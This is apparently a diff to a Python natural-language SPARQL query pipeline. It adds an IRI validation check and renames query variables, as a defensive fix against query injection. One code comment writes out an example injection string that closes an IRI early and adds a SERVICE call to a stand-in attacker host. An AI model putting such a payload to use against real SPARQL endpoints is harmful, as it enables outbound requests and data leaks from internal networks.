@@ -407,6 +407,25 @@ def _neptune_safe_duration(sparql: str) -> str:
 _ENTITY_URI_PREFIX = "https://cograph.tech/entities/"
 
 
+#: Codepoints the SPARQL 1.1 IRIREF production forbids INSIDE ``<…>``:
+#: ``'<' ([^<>"{}|^`\] - [#x00-#x20])* '>'``. A value containing any of them
+#: cannot be interpolated into an IRI without changing the query's syntax.
+_IRIREF_FORBIDDEN = frozenset('<>"{}|^`\\')
+
+
+def _is_interpolatable_iri(value: str) -> bool:
+    """True when ``value`` can be written as ``<value>`` and stay one IRI token.
+
+    The check is the IRIREF grammar's own exclusion set rather than a blocklist
+    of the characters one particular payload happened to use: ``>`` terminates
+    the IRI, and every other excluded codepoint is excluded precisely because it
+    could change how the rest of the query tokenises.
+    """
+    return bool(value) and not any(
+        c in _IRIREF_FORBIDDEN or ord(c) <= 0x20 for c in value
+    )
+
+
 def _row_has_entity_object(row: dict) -> bool:
     """True if any value in the row is an entity IRI (``…/entities/…``).
 
@@ -1389,7 +1408,7 @@ class NLQueryPipeline:
                 desc = desc[len(article):]
         if not desc:
             return None
-        q = (
+        anchor_query = (
             f"SELECT ?wkt FROM <{data_graph}> WHERE {{ "
             f"?e ?lp ?lbl . "
             f'FILTER(isLiteral(?lbl) && CONTAINS(LCASE(STR(?lbl)), "{desc}")) '
@@ -1398,7 +1417,7 @@ class NLQueryPipeline:
             f"}} LIMIT 1"
         )
         try:
-            raw = await self.neptune.query(q)
+            raw = await self.neptune.query(anchor_query)
             _, rows = parse_sparql_results(raw)
         except Exception:
             logger.warning("anchor_resolve_failed", exc_info=True)
@@ -2039,11 +2058,11 @@ class NLQueryPipeline:
 
                 # Define cardinality check function ONCE (used for both attrs and rels)
                 async def _count_predicate(tn: str, an: str, uri: str) -> tuple[str, str, int]:
-                    q = (
+                    count_query = (
                         f"SELECT (COUNT(DISTINCT ?val) AS ?cnt) FROM <{instance_graph}> "
                         f"WHERE {{ ?s <{uri}> ?val }}"
                     )
-                    raw = await self.neptune.query(q)
+                    raw = await self.neptune.query(count_query)
                     _, bindings = parse_sparql_results(raw)
                     cnt = int(bindings[0].get("cnt", 0)) if bindings else 0
                     return tn, an, cnt
@@ -2072,11 +2091,11 @@ class NLQueryPipeline:
 
                         # Phase 2: Concurrent value fetches for low-cardinality attrs
                         async def _fetch_vals(tn: str, an: str, uri: str) -> tuple[str, str, list[str]]:
-                            q = (
+                            enum_values_query = (
                                 f"SELECT DISTINCT ?val FROM <{instance_graph}> "
                                 f"WHERE {{ ?s <{uri}> ?val }} LIMIT {MAX_ENUM_CARDINALITY}"
                             )
-                            raw = await self.neptune.query(q)
+                            raw = await self.neptune.query(enum_values_query)
                             _, bindings = parse_sparql_results(raw)
                             return tn, an, [r["val"] for r in bindings if r.get("val")]
 
@@ -2867,15 +2886,39 @@ class NLQueryPipeline:
         ?label`` therefore returns whatever label ANOTHER workspace attached to
         that IRI, and the answer renders it as ours.
         """
-        # Collect all unique URIs that look like Omnix entities or types
+        # Collect all unique URIs that look like Omnix entities or types.
+        #
+        # The prefix test alone is NOT enough to interpolate a value into
+        # `<{u}>`. `parse_sparql_results` flattens every binding to its `.value`
+        # string, so a LITERAL is indistinguishable from an IRI here — and a
+        # literal is arbitrary text the workspace's own ingest put in the graph.
+        # A value that merely STARTS with the entities prefix and then carries
+        # `>` closes the IRI early, and the rest of it becomes query syntax:
+        #
+        #     https://cograph.tech/entities/X> } SERVICE <http://attacker/> { … } }#
+        #
+        # parses cleanly and gives the attacker an outbound SERVICE call from
+        # inside the VPC. That is the same channel rule C rejects on the raw
+        # route. `_is_interpolatable_iri` applies the SPARQL IRIREF grammar's own
+        # exclusion set, so nothing that could terminate or escape the IRI is
+        # ever interpolated. Dropping a value only costs it a label (the
+        # `_humanize_uri` fallback below still names it).
         uris: set[str] = set()
         for row in bindings:
             for v in row.values():
-                if isinstance(v, str) and (
+                if not isinstance(v, str):
+                    continue
+                if not (
                     v.startswith("https://cograph.tech/entities/")
                     or v.startswith("https://cograph.tech/types/")
                 ):
-                    uris.add(v)
+                    continue
+                if not _is_interpolatable_iri(v):
+                    logger.warning(
+                        "label_lookup_skipped_unsafe_value", value_prefix=v[:60]
+                    )
+                    continue
+                uris.add(v)
 
         if not uris:
             return {}
